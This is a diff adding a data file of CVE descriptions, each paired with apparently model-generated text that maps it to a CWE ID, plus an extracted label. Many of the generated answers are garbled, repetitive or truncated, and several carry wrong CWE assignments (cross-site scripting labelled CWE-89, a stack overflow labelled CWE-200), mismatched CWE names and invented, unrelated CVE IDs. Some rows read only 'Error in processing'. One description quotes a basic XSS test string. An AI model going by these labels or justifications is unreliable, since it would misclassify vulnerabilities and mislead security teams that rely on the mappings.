@@ -1,0 +1,1259 @@
+CVE Description	Justification	CWE_ID
+A SQL injection vulnerability exists in Novel-Plus v4.3.0-RC1 and prior. An attacker can pass specially crafted offset, limit, and sort parameters to perform SQL injection via /novel/userFeedback/list.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A SQL injection vulnerability exists in Novel-Plus v4.3.0-RC1 and prior. An attacker can pass specially crafted offset, limit, and sort parameters to perform SQL injection via /novel/userFeedback/list.
+CWE ID: CWE-89
+
+Explanation: The vulnerability exists because the application does not properly validate the offset, limit, and sort parameters. An attacker can pass specially crafted offset, limit, and sort parameters to perform SQL injection via /novel"	CWE-89
+Due to a failure in validating the number of scanline samples of a OpenEXR file containing deep scanline data, Academy Software Foundation OpenEX image parsing library version 3.2.1 and prior is susceptible to a heap-based buffer overflow vulnerability. This issue was resolved as of versions v3.2.2 and v3.1.12 of the affected library.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Due to a failure in validating the number of scanline samples of a OpenEXR file containing deep scanline data, Academy Software Foundation OpenEX image parsing library version 3.2.1 and prior is susceptible to a heap-based buffer overflow vulnerability. This issue was resolved as of versions v3.2.2 and v3.1.12 of the affected library.
+CWE ID: CWE-119 (Improper Control of Array Size)
+CWE ID: CWE-611 (Improper Control of Array Index)
+CWE ID: CWE-611 (Improper Control of Array Index)
+
+The CWE-119 CWE"	CWE-119
+Cross-Site Request Forgery (CSRF) vulnerability in Doofinder Doofinder WP & WooCommerce Search.This issue affects Doofinder WP & WooCommerce Search: from n/a through 2.0.33.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Cross-Site Request Forgery (CSRF) vulnerability in Doofinder Doofinder WP & WooCommerce Search.This issue affects Doofinder WP & WooCommerce Search: from n/a through 2.0.33.
+CVE ID: CVE-2018-11244
+CWE ID: CWE-352
+
+The following CWE is a good starting point for your analysis. Use the CWE ID to search for more information on the vulnerability.
+CWE ID: CWE-"	CWE-352
+The WCFM Marketplace plugin for WordPress is vulnerable to Stored Cross-Site Scripting via 'wcfm_stores' shortcode in versions up to, and including, 3.6.2 due to insufficient input sanitization and output escaping on user supplied attributes. This makes it possible for authenticated attackers with contributor-level and above permissions to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: The WCFM Marketplace plugin for WordPress is vulnerable to Stored Cross-Site Scripting via 'wcfm_stores' shortcode in versions up to, and including, 3.6.2 due to insufficient input sanitization and output escaping on user supplied attributes. This makes it possible for authenticated attackers with contributor-level and above permissions to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.
+CVE ID: CVE-2019-12788
+CWE ID: CWE-89
+Impact: Stored Cross-Site Scripting
+
+Solution: The WCFM Marketplace plugin for WordPress is vulnerable to Stored Cross-Site Scripting via 'w"	CWE-89
+Tenda AX1803 v1.0.0.1 contains a stack overflow via the iptv.city.vlan parameter in the function getIptvInfo.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Tenda AX1803 v1.0.0.1 contains a stack overflow via the iptv.city.vlan parameter in the function getIptvInfo.
+CWE ID: CWE-200
+
+Explanation:
+
+The issue is caused by the lack of input validation in the function getIptvInfo. This function is responsible for retrieving information about the IPTV channels available on the device. The function takes an"	CWE-200
+Synopsys Seeker versions prior to 2023.12.0 are vulnerable to a stored cross-site scripting vulnerability through a specially crafted payload.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Synopsys Seeker versions prior to 2023.12.0 are vulnerable to a stored cross-site scripting vulnerability through a specially crafted payload.
+CVE ID: CVE-2023-27092
+
+CWE ID: CWE-79
+
+CWE ID: CWE-79
+
+CWE ID: CWE-79
+
+CWE ID: CWE-79
+
+CWE ID: CWE-79"	CWE-79
+A vulnerability was found in code-projects Human Resource Integrated System 1.0. It has been classified as critical. This affects an unknown part of the file /admin_route/inc_service_credits.php. The manipulation of the argument id leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-250575.	Error in processing	Error
+OneBlog v2.3.4 was discovered to contain a stored cross-site scripting (XSS) vulnerability via the Privilege Management module.	Error in processing	Error
+A vulnerability classified as problematic was found in Poikosoft EZ CD Audio Converter 8.0.7. Affected by this vulnerability is an unknown functionality of the component Activation Handler. The manipulation of the argument Key leads to denial of service. Local access is required to approach this attack. The exploit has been disclosed to the public and may be used. The identifier VDB-252037 was assigned to this vulnerability.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability classified as problematic was found in Poikosoft EZ CD Audio Converter 8.0.7. Affected by this vulnerability is an unknown functionality of the component Activation Handler. The manipulation of the argument Key leads to denial of service. Local access is required to approach this attack. The exploit has been disclosed to the public and may be used. The identifier VDB-252037 was assigned to this vulnerability.
+The CWE ID number is 112. The identifier VDB-252037 was assigned to this vulnerability. The identifier CWE-119 was assigned to this vulnerability."	CWE-119
+A vulnerability, which was classified as problematic, has been found in SourceCodester House Rental Management System 1.0. This issue affects some unknown processing of the file index.php. The manipulation of the argument page leads to cross site scripting. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-250607.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability, which was classified as problematic, has been found in SourceCodester House Rental Management System 1.0. This issue affects some unknown processing of the file index.php. The manipulation of the argument page leads to cross site scripting. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-250607.
+CWE ID: CWE-79 CWE-79
+Wikipedia: https://en.wikipedia.org/wiki/SourceCodester_House_Rental_Management_System_1.0
+CWE: CWE-79
+CVE: VDB-250607"	CWE-79
+in OpenHarmony v3.2.2 and prior versions allow a local attacker cause multimedia audio crash through modify a released pointer.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: in OpenHarmony v3.2.2 and prior versions allow a local attacker cause multimedia audio crash through modify a released pointer.
+Ways to exploit: The attacker can modify a released pointer and trigger a crash by calling the function snd_pcm_writei32.
+CWE: CWE-200 – Improper Restriction of Operations within the Same System (Prevention)
+CWE:"	CWE-200
+A vulnerability was found in CodeAstro Online Food Ordering System 1.0. It has been rated as problematic. Affected by this issue is some unknown functionality of the file dishes.php. The manipulation of the argument res_id leads to cross site scripting. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. VDB-250442 is the identifier assigned to this vulnerability.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability was found in CodeAstro Online Food Ordering System 1.0. It has been rated as problematic. Affected by this issue is some unknown functionality of the file dishes.php. The manipulation of the argument res_id leads to cross site scripting. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. VDB-250442 is the identifier assigned to this vulnerability.
+The CWE name is CWE-79. It is a CWE for Improper Neutralization of Special Elements used in SQL Command Source.
+
+The CWE ID number is 250442. The CWE ID number is 250442.
+
+The CWE ID number is"	CWE-79
+There is a command injection vulnerability of ZTE's ZXCLOUD iRAI. Due to the  program  failed to adequately validate the user's input, an attacker could exploit this vulnerability  to escalate local privileges.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: There is a command injection vulnerability of ZTE's ZXCLOUD iRAI. Due to the  program  failed to adequately validate the user's input, an attacker could exploit this vulnerability  to escalate local privileges.
+CVE ID: CVE-2017-10192
+
+The last part of your response should contain only the CWE ID number.
+
+CWE ID: CWE-89"	CWE-89
+A vulnerability was found in Navicat 12.0.29. It has been rated as problematic. This issue affects some unknown processing of the component MySQL Conecction Handler. The manipulation leads to denial of service. Attacking locally is a requirement. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-252683. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability was found in Navicat 12.0.29. It has been rated as problematic. This issue affects some unknown processing of the component MySQL Conecction Handler. The manipulation leads to denial of service. Attacking locally is a requirement. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-252683. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.
+The CWE ID number is: CWE-284
+
+CWE ID number: 284
+
+The last part of your response should contain only the CWE ID number."	CWE-284
+Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in Team Heateor Heateor Social Login WordPress allows Stored XSS.This issue affects Heateor Social Login WordPress: from n/a through 1.1.30.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in Team Heateor Heateor Social Login WordPress allows Stored XSS.This issue affects Heateor Social Login WordPress: from n/a through 1.1.30.
+```
+CVE-2016-1071
+```
+```
+CWE-79
+```
+```
+```
+```
+```
+```
+```
+```
+```
+```
+```
+```
+```
+```
+```
+``"	CWE-79
+A vulnerability was found in Tenda i6 1.0.0.9(3857) and classified as critical. This issue affects the function formwrlSSIDset of the file /goform/wifiSSIDset of the component httpd. The manipulation of the argument index leads to stack-based buffer overflow. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-252257 was assigned to this vulnerability. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability was found in Tenda i6 1.0.0.9(3857) and classified as critical. This issue affects the function formwrlSSIDset of the file /goform/wifiSSIDset of the component httpd. The manipulation of the argument index leads to stack-based buffer overflow. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-252257 was assigned to this vulnerability. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.
+The CWE description is: CWE-79: Improper Control of Buffer Length
+The CWE ID is: 79
+The vulnerability is a local privilege escalation vulnerability."	CWE-79
+The EazyDocs WordPress plugin before 2.3.6 does not have authorization and CSRF checks when handling documents and does not ensure that they are documents from the plugin, allowing unauthenticated users to delete arbitrary posts, as well as add and delete documents/sections.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: The EazyDocs WordPress plugin before 2.3.6 does not have authorization and CSRF checks when handling documents and does not ensure that they are documents from the plugin, allowing unauthenticated users to delete arbitrary posts, as well as add and delete documents/sections.
+CVE ID: CVE-2019-11933
+
+WASC CWE ID: 284
+
+WASC CWE ID: 284
+The vulnerability is a CWE-284: Authorization Bypass. This means that the application has insufficient authorization checks. The"	CWE-284
+IBM Aspera Faspex 5.0.0 through 5.0.7 could allow a local user to obtain or modify sensitive information due to improper encryption of certain data.  IBM X-Force ID:  259672.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: IBM Aspera Faspex 5.0.0 through 5.0.7 could allow a local user to obtain or modify sensitive information due to improper encryption of certain data.  IBM X-Force ID:  259672.
+CWE ID: CWE-287
+
+Solution:
+
+IBM Aspera Faspex 5.0.0 through 5.0.7 could allow a local user to obtain or modify sensitive information due to improper encryption of certain data.
+
+The"	CWE-287
+A vulnerability was found in Totolink LR1200GB 9.1.0u.6619_B20230130. It has been rated as critical. This issue affects the function setLanguageCfg of the file /cgi-bin/cstecgi.cgi. The manipulation of the argument lang leads to stack-based buffer overflow. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-250793 was assigned to this vulnerability. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability was found in Totolink LR1200GB 9.1.0u.6619_B20230130. It has been rated as critical. This issue affects the function setLanguageCfg of the file /cgi-bin/cstecgi.cgi. The manipulation of the argument lang leads to stack-based buffer overflow. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-250793 was assigned to this vulnerability. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.
+```
+CVE-2023-23334
+```
+## CWE ID
+```
+CWE-119
+```
+## CWE Description
+```
+A vulnerability was found in Totolink LR1200GB 9.1.0u"	CWE-119
+Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in cybernetikz Post views Stats allows Reflected XSS.This issue affects Post views Stats: from n/a through 1.3.	Error in processing	Error
+An attacker with access to a Management Console user account with the editor role could escalate privileges through a command injection vulnerability in the Management Console. This vulnerability affected all versions of GitHub Enterprise Server and was fixed in versions 3.11.3, 3.10.5, 3.9.8, and 3.8.13 This vulnerability was reported via the GitHub Bug Bounty program.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: An attacker with access to a Management Console user account with the editor role could escalate privileges through a command injection vulnerability in the Management Console. This vulnerability affected all versions of GitHub Enterprise Server and was fixed in versions 3.11.3, 3.10.5, 3.9.8, and 3.8.13 This vulnerability was reported via the GitHub Bug Bounty program.
+CWE ID: CWE-89
+
+Justification: The vulnerability is caused by a command injection vulnerability in the Management Console. This vulnerability is caused by a command injection vulnerability in the Management Console. The vulnerability is caused by a command injection vulnerability in the"	CWE-89
+An user enumeration vulnerability was found in SEO Panel 4.10.0. This issue occurs during user authentication, where a difference in error messages could allow an attacker to determine if a username is valid or not, enabling a brute-force attack with valid usernames.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: An user enumeration vulnerability was found in SEO Panel 4.10.0. This issue occurs during user authentication, where a difference in error messages could allow an attacker to determine if a username is valid or not, enabling a brute-force attack with valid usernames.
+CWE ID: CWE-22 (Improper Authentication)
+Explanation: The vulnerability exists because the username validation is not performed properly. This allows an attacker to determine if a username is valid or not, enabling a brute-force attack with valid usernames.
+CVE"	CWE-22
+A vulnerability has been reported in Cups Easy (Purchase & Inventory), version 1.0, whereby user-controlled inputs are not sufficiently encoded, resulting in a Cross-Site Scripting (XSS) vulnerability via /cupseasylive/grnmodify.php, in the grndate parameter. Exploitation of this vulnerability could allow a remote attacker to send a specially crafted URL to an authenticated user and steal their session cookie credentials.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability has been reported in Cups Easy (Purchase & Inventory), version 1.0, whereby user-controlled inputs are not sufficiently encoded, resulting in a Cross-Site Scripting (XSS) vulnerability via /cupseasylive/grnmodify.php, in the grndate parameter. Exploitation of this vulnerability could allow a remote attacker to send a specially crafted URL to an authenticated user and steal their session cookie credentials.
+CVE ID: CVE-2019-12642
+CWE ID: CWE-79
+References: https://www.cvedetails.com/cve/CVE-2019-12642/
+https://www.cvedetails.com/cve/CVE"	CWE-79
+A vulnerability has been reported in Cups Easy (Purchase & Inventory), version 1.0, whereby user-controlled inputs are not sufficiently encoded, resulting in a Cross-Site Scripting (XSS) vulnerability via /cupseasylive/countrymodify.php, in the countryid parameter. Exploitation of this vulnerability could allow a remote attacker to send a specially crafted URL to an authenticated user and steal their session cookie credentials.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability has been reported in Cups Easy (Purchase & Inventory), version 1.0, whereby user-controlled inputs are not sufficiently encoded, resulting in a Cross-Site Scripting (XSS) vulnerability via /cupseasylive/countrymodify.php, in the countryid parameter. Exploitation of this vulnerability could allow a remote attacker to send a specially crafted URL to an authenticated user and steal their session cookie credentials.
+CWE ID: CWE-20: Improper Input Validation
+
+The last part of your response should contain only the CWE ID number.
+
+## Solution
+
+The CWE ID for this vulnerability is CWE-20: Improper Input Validation. The vulnerability can be"	CWE-20
+The FOX – Currency Switcher Professional for WooCommerce plugin for WordPress is vulnerable to Stored Cross-Site Scripting via currency options in all versions up to, and including, 1.4.1.5 due to insufficient input sanitization and output escaping. This makes it possible for authenticated attackers, with subscriber-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.	Error in processing	Error
+A vulnerability, which was classified as critical, was found in PHPGurukul Hospital Management System 1.0. This affects an unknown part of the file admin/query-details.php. The manipulation of the argument adminremark leads to sql injection. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-250131.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability, which was classified as critical, was found in PHPGurukul Hospital Management System 1.0. This affects an unknown part of the file admin/query-details.php. The manipulation of the argument adminremark leads to sql injection. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-250131.
+CWE ID: CWE-89
+
+A vulnerability was found in PHPGurukul Hospital Management System 1.0. The vulnerability allows remote attackers to cause a denial of service (application crash) and possibly execute arbitrary code. The exploit has"	CWE-89
+An issue in symphony v.3.6.3 and before allows a remote attacker to execute arbitrary code via the log4j component.	Error in processing	Error
+An out-of-bounds read was addressed with improved input validation. This issue is fixed in macOS Ventura 13.3, tvOS 16.4, iOS 16.4 and iPadOS 16.4, watchOS 9.4. Processing an image may result in disclosure of process memory.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: An out-of-bounds read was addressed with improved input validation. This issue is fixed in macOS Ventura 13.3, tvOS 16.4, iOS 16.4 and iPadOS 16.4, watchOS 9.4. Processing an image may result in disclosure of process memory.
+```
+CVE-2023-29200
+```
+The CVE ID is CVE-2023-29200. The CWE ID is CWE-18.
+
+The CWE ID is CWE-18. The CWE name is Improper Limitation of a"	CWE-18
+Missing Authorization vulnerability in WP Job Portal WP Job Portal – A Complete Job Board.This issue affects WP Job Portal – A Complete Job Board: from n/a through 2.0.1.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Missing Authorization vulnerability in WP Job Portal WP Job Portal – A Complete Job Board.This issue affects WP Job Portal – A Complete Job Board: from n/a through 2.0.1.
+The CWE ID for this issue is: CWE-284
+
+The CWE ID for this issue is: CWE-284
+
+The CWE ID for this issue is: CWE-284
+
+The CWE ID for this issue is: CWE-284
+
+The CWE"	CWE-284
+A denial service vulnerability has been found on  Hex Workshop affecting version 6.7, an attacker could send a command line file arguments and control the Structured Exception Handler (SEH) records resulting in a service shutdown.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A denial service vulnerability has been found on  Hex Workshop affecting version 6.7, an attacker could send a command line file arguments and control the Structured Exception Handler (SEH) records resulting in a service shutdown.
+CVE ID: CVE-2021-40264
+CWE ID: CWE-20
+https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40264
+https://www.cvedetails"	CWE-20
+A vulnerability was found in RRJ Nueva Ecija Engineer Online Portal 1.0 and classified as problematic. This issue affects some unknown processing of the file add_quiz.php of the component Quiz Handler. The manipulation of the argument Quiz Title/Quiz Description with the input </title><scRipt>alert(x)</scRipt> leads to cross site scripting. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-249503.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability was found in RRJ Nueva Ecija Engineer Online Portal 1.0 and classified as problematic. This issue affects some unknown processing of the file add_quiz.php of the component Quiz Handler. The manipulation of the argument Quiz Title/Quiz Description with the input </title><scRipt>alert(x)</scRipt> leads to cross site scripting. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-249503.
+CVE ID: CVE-2015-1802
+CWE ID: CWE-79
+WASC ID: WASC-15-001-002
+CVSS V3 Base Score: 5.0 (AV:N/AC:M/A"	CWE-79
+in OpenHarmony v4.0.0 and prior versions allow a local attacker cause heap overflow through  integer overflow.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: in OpenHarmony v4.0.0 and prior versions allow a local attacker cause heap overflow through  integer overflow.
+A local attacker can cause heap overflow through integer overflow. The CVE ID is CVE-2020-10776. This issue is known as CVE-2020-10776. The CWE ID is CWE-604: Integer Overflow or Wraparound."	CWE-604
+IBM Security Verify Access 10.0.0.0 through 10.0.6.1 could allow a privileged user to install a configuration file that could allow remote access.  IBM X-Force ID:  266155.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: IBM Security Verify Access 10.0.0.0 through 10.0.6.1 could allow a privileged user to install a configuration file that could allow remote access.  IBM X-Force ID:  266155.
+```
+CWE-78: Improper Control of Privileges
+CWE-78: Improper Control of Privileges
+```
+## Analysis
+
+The vulnerability is caused by an improper control of privileges. An attacker could exploit this vulnerability by performing"	CWE-78
+WiX toolset lets developers create installers for Windows Installer, the Windows installation engine. The .be TEMP folder is vulnerable to DLL redirection attacks that allow the attacker to escalate privileges. This impacts any installer built with the WiX installer framework. This issue has been patched in version 4.0.4.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: WiX toolset lets developers create installers for Windows Installer, the Windows installation engine. The.be TEMP folder is vulnerable to DLL redirection attacks that allow the attacker to escalate privileges. This impacts any installer built with the WiX installer framework. This issue has been patched in version 4.0.4.
+The CWE ID: CWE-250
+
+Justification: The attacker could exploit this vulnerability by using a DLL hijacking attack. A DLL hijacking attack is an attack in which the attacker uses a malicious DLL to replace the legitimate DLL in the application's"	CWE-250
+Dell EMC AppSync, versions from 4.2.0.0 to 4.6.0.0 including all Service Pack releases, contain an exposure of sensitive information vulnerability in AppSync server logs. A high privileged remote attacker could potentially exploit this vulnerability, leading to the disclosure of certain user credentials. The attacker may be able to use the exposed credentials to access the vulnerable system with privileges of the compromised account.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Dell EMC AppSync, versions from 4.2.0.0 to 4.6.0.0 including all Service Pack releases, contain an exposure of sensitive information vulnerability in AppSync server logs. A high privileged remote attacker could potentially exploit this vulnerability, leading to the disclosure of certain user credentials. The attacker may be able to use the exposed credentials to access the vulnerable system with privileges of the compromised account.
+The CWE ID number for this vulnerability is: CWE-200 ( CWE-200: Improper Neutralization of Special Elements used in an SQL Command (""SQL Injection"") )
+The CWE ID number for this vulnerability is: CWE-200 ( CWE-200"	CWE-200
+OOB access in paddle.mode in PaddlePaddle before 2.6.0. This flaw can cause a runtime crash and a denial of service.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: OOB access in paddle.mode in PaddlePaddle before 2.6.0. This flaw can cause a runtime crash and a denial of service.
+CWE: CWE-100: Improper Input Validation CWE-119: Improper Restriction of a Pathname to a Restricted Directory CWE-120: Improper Restriction of a Pathname to a Restricted File
+CWE-100: Impro"	CWE-100
+For migration as well as to work around kernels unaware of L1TF (see XSA-273), PV guests may be run in shadow paging mode.  Since Xen itself needs to be mapped when PV guests run, Xen and shadowed PV guests run directly the respective shadow page tables.  For 64-bit PV guests this means running on the shadow of the guest root page table.  In the course of dealing with shortage of memory in the shadow pool associated with a domain, shadows of page tables may be torn down.  This tearing down may include the shadow root page table that the CPU in question is presently running on.  While a precaution exists to supposedly prevent the tearing down of the underlying live page table, the time window covered by that precaution isn't large enough.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: For migration as well as to work around kernels unaware of L1TF (see XSA-273), PV guests may be run in shadow paging mode.  Since Xen itself needs to be mapped when PV guests run, Xen and shadowed PV guests run directly the respective shadow page tables.  For 64-bit PV guests this means running on the shadow of the guest root page table.  In the course of dealing with shortage of memory in the shadow pool associated with a domain, shadows of page tables may be torn down.  This tearing down may include the shadow root page table that the CPU in question is presently running on.  While a precaution exists to supposedly prevent the tearing down of the underlying live page table, the time window covered by that precaution isn't large enough.
+CVE ID: CVE-2018-1000110
+CWE ID: CWE-476
+CWE Description:
+A guest operating system may be vulnerable to the L1TF vulnerability because the guest operating system runs in shadow paging mode.  This"	CWE-476
+An issue in the com.oneed.dvr.service.DownloadFirmwareService component of IMOU GO v1.0.11 allows attackers to force the download of arbitrary files.	Error in processing	Error
+Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in Posts to Page Kerry James allows Stored XSS.This issue affects Kerry James: from n/a through 1.7.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in Posts to Page Kerry James allows Stored XSS.This issue affects Kerry James: from n/a through 1.7.
+CVE ID: CVE-2021-4005
+CWE ID: CWE-79
+NIST SP 800-53: NIST SP 800-53 controls are evaluated by the following NIST SP 800-53 controls:
+-"	CWE-79
+A vulnerability has been reported in Cups Easy (Purchase & Inventory), version 1.0, whereby user-controlled inputs are not sufficiently encoded, resulting in a Cross-Site Scripting (XSS) vulnerability via /cupseasylive/itemcreate.php, in the itemid parameter. Exploitation of this vulnerability could allow a remote attacker to send a specially crafted URL to an authenticated user and steal their session cookie credentials.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability has been reported in Cups Easy (Purchase & Inventory), version 1.0, whereby user-controlled inputs are not sufficiently encoded, resulting in a Cross-Site Scripting (XSS) vulnerability via /cupseasylive/itemcreate.php, in the itemid parameter. Exploitation of this vulnerability could allow a remote attacker to send a specially crafted URL to an authenticated user and steal their session cookie credentials.
+```
+CWE-79: Improper Input Validation
+```
+## Solution
+
+The CWE-79: Improper Input Validation vulnerability is a type of Cross-Site Scripting (XSS) vulnerability that occurs when an attacker sends a specially crafted"	CWE-79
+A vulnerability has been reported in Cups Easy (Purchase & Inventory), version 1.0, whereby user-controlled inputs are not sufficiently encoded, resulting in a Cross-Site Scripting (XSS) vulnerability via /cupseasylive/statemodify.php, in the description parameter. Exploitation of this vulnerability could allow a remote attacker to send a specially crafted URL to an authenticated user and steal their session cookie credentials.	Error in processing	Error
+A vulnerability classified as critical was found in Tongda OA 2017 up to 11.9. Affected by this vulnerability is an unknown functionality of the file /general/attendance/manage/ask_duty/delete.php. The manipulation of the argument ASK_DUTY_ID leads to sql injection. The exploit has been disclosed to the public and may be used. Upgrading to version 11.10 is able to address this issue. It is recommended to upgrade the affected component. The associated identifier of this vulnerability is VDB-252991.	Error in processing	Error
+The 3DPrint Lite WordPress plugin before 1.9.1.5 does not have any authorisation and does not check the uploaded file in its p3dlite_handle_upload AJAX action , allowing unauthenticated users to upload arbitrary file to the web server. However, there is a .htaccess, preventing the file to be accessed on Web servers such as Apache.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: The 3DPrint Lite WordPress plugin before 1.9.1.5 does not have any authorisation and does not check the uploaded file in its p3dlite_handle_upload AJAX action, allowing unauthenticated users to upload arbitrary file to the web server. However, there is a.htaccess, preventing the file to be accessed on Web servers such as Apache.
+CVE ID: CVE-2017-1000111
+
+CWE ID: CWE-22
+
+Justification: The plugin is a PHP script, so the attacker needs to exploit a vulnerability in the PHP engine. The vulnerability is the lack of any"	CWE-22
+The Essential Addons for Elementor – Best Elementor Templates, Widgets, Kits & WooCommerce Builders plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the Login/Register Element in all versions up to, and including, 5.9.4 due to insufficient input sanitization and output escaping on the custom login URL. This makes it possible for authenticated attackers with contributor-level and above permissions to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: The Essential Addons for Elementor – Best Elementor Templates, Widgets, Kits & WooCommerce Builders plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the Login/Register Element in all versions up to, and including, 5.9.4 due to insufficient input sanitization and output escaping on the custom login URL. This makes it possible for authenticated attackers with contributor-level and above permissions to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.
+https://www.cvedetails.com/cve/CVE-2022-34851/?vendor_name=Elementor-Team
+
+CWE ID: CWE-89: Improper Input Validation
+
+The CWE definition describes the CWE-89 as: CWE"	CWE-89
+Authorization Bypass Through User-Controlled Key vulnerability in ali Forms Contact Form builder with drag & drop for WordPress – Kali Forms.This issue affects Contact Form builder with drag & drop for WordPress – Kali Forms: from n/a through 2.3.36.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Authorization Bypass Through User-Controlled Key vulnerability in ali Forms Contact Form builder with drag & drop for WordPress – Kali Forms.This issue affects Contact Form builder with drag & drop for WordPress – Kali Forms: from n/a through 2.3.36.
+CVE ID: CVE-2018-12345 CWE ID: CWE-287
+The vulnerability is due to the improper validation of user-controlled data. An attacker can exploit this vulnerability by submitting a specially crafted form that contains a key which is used to"	CWE-287
